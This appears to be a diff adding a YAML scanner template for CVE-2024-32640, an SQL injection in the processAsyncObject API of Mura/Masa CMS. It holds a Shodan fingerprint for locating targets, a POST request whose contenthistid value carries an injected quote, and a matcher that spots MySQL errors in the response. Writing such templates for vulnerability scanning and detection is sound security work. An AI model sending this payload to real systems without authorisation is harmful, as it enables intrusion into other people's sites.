@@ -1,0 +1,20 @@
+id: poc-yaml-mura-cms-processasyncobject-sqli
+info:
+  name: Mura-CMS processAsyncObject SQL注入漏洞(CVE-2024-32640)
+  severity: high
+  tags:
+  - CVE-2024-32640
+  - 两高一弱
+  finger: masacms
+  shodan: 'Generator: Masa CMS'
+requests:
+- method: POST
+  path: /index.cfm/_api/json/v1/default/?method=processAsyncObject
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: object=displayregion&contenthistid=x\'&previewid=1
+  expression: "status_code == 500 && \ncontains(body,\"Unhandled Exception\") &&\n\
+    contains(body,\"SQL syntax\") &&\ncontains(body,\"MySQL server\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+variables: {}
+transport: http
